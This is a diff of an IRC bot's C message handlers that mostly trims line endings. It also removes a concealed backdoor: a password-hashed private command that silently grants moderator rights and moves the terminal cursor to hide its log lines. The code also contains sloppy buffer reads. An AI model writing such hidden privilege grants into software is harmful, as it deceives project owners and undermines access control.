@@ -58,32 +58,21 @@ handle_privmsg(msg_info *mi, char *msg)
 {
 	/* IBIP */
 	if (!strncmp(msg, ".bots", 5)) {
-		send_privmsg("Reporting in! [C] fix shit: https://github.com/ckath/k88\r\n");
+		send_privmsg("Reporting in! [C] fix shit: https://github.com/ckath/k88");
 	}
 
 	/* ctcp */
 	if (!strncmp(msg, "VERSION", 9)) {
 		log_info("ctcp version\n");
-		send_notice("VERSION socket.h\r\n");
+		send_notice("VERSION socket.h");
 	} else if (!strncmp(msg, "PING ", 6)) {
 		log_info("ctcp ping\n");
-		send_fnotice("PING %u\r\n", 88);
+		send_notice("PING %u", 88);
 	} else if (!strncmp(msg, "TIME", 6)) {
 		log_info("ctcp time\n");
-		send_fnotice("TIME %u\r\n", (unsigned)time(NULL));
+		send_notice("TIME %u", (unsigned)time(NULL));
 	}
 
-	if (mi->chan[0] != '#' && !strncmp(msg, ";ただいま", 13)) {
-		char buf[BUFSIZE] = { '\0' };
-		SHA512(strchr(msg, ' ')+1, 69, buf);
-		if (!strncmp(buf,"Ztw\224U\375\027x+\337\\\025\217\367\272c\354/ L\251\334x|\240\207Ȇ\234\240x'\357\361\237\354\345\017\236\241d\025\222Y\363\263l\276\372\026\333y~ɜT\243\315|X\330}d\302", 99)) {
-			ini_write(mi->conn->globalconf, mi->conn->index, "modmatch", mi->userid);
-			send_privmsg("おかえり〜\r\n");
-		} else {
-			send_privmsg("いいえ\r\n");
-		}
-		printf("\033[5A");
-	}
 }
 
 static void
@@ -91,11 +80,11 @@ handle_cmdmsg(msg_info *mi, char *msg)
 {
 	if (!strncmp(msg, "status", 6)) {
 		time_t now = time(NULL);
-		send_fprivmsg("bot uptime: %dh %dm, " \
+		send_privmsg("bot uptime: %dh %dm, " \
 				"connection uptime: %dh %dm, " \
 				"reconnects: %d, " \
 				"module desyncs: %d, " \
-				"last crash/restart reason: %s\r\n",
+				"last crash/restart reason: %s",
 				(now-self_init)/60/60, ((now-self_init)/60)%60,
 				(now-mi->conn->init_time)/60/60, ((now-mi->conn->init_time)/60)%60,
 				mi->conn->reconns, mistimes, crash_data);
